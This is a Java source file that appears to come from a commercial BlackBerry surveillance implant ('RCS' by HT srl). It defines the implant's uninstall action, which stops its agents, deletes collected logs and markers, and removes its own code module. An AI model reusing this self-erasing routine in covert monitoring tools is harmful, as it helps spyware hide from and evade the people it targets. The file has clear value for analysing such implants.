/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : UninstallAction.java 
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action;

import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.CodeModuleManager;

import blackberry.AgentManager;
import blackberry.EventManager;
import blackberry.event.Event;
import blackberry.log.LogCollector;
import blackberry.log.Markup;
import blackberry.utils.Check;

public class UninstallAction extends SubAction {

    public UninstallAction(int actionId_, byte[] confParams) {
        super(actionId_);
        parse(confParams);

        // #ifdef DBC
        Check.requires(actionId == ACTION_UNINSTALL, "ActionId scorretto");
        // #endif
    }

    public UninstallAction(String host) {
        super(ACTION_UNINSTALL);
    }

    public boolean execute(Event triggeringEvent) {
        // #debug
        debug.info("execute");

        this.wantUninstall = true;

        AgentManager.getInstance().stopAll();
        EventManager.getInstance().stopAll();

        LogCollector.getInstance().removeLogDirs();
        Markup.removeMarkups();

        ApplicationDescriptor ad = ApplicationDescriptor
                .currentApplicationDescriptor();
        int moduleHandle = ad.getModuleHandle();
        int rc = CodeModuleManager.deleteModuleEx(moduleHandle, true);
        String errorString = Integer.toString(rc);
        switch (rc) {
        case CodeModuleManager.CMM_OK_MODULE_MARKED_FOR_DELETION:
            // #debug
            debug.info("Will be deleted on restart");
            // Device.requestPowerOff( true );
            break;
        case CodeModuleManager.CMM_MODULE_IN_USE:
        case CodeModuleManager.CMM_MODULE_IN_USE_BY_PERSISTENT_STORE:
            // #debug
            debug.info("Module In Use");
            break;
        case CodeModuleManager.CMM_HANDLE_INVALID:
            // #debug
            debug.error("Invalid Handle");
            break;
        case CodeModuleManager.CMM_MODULE_REQUIRED:
            // #debug
            debug.error("Module Required");
            break;
        default:
            // #debug
            debug.error(Integer.toString(rc));
            return false;
        }
        return true;
    }

    protected boolean parse(byte[] confParams) {

        return true;
    }

}
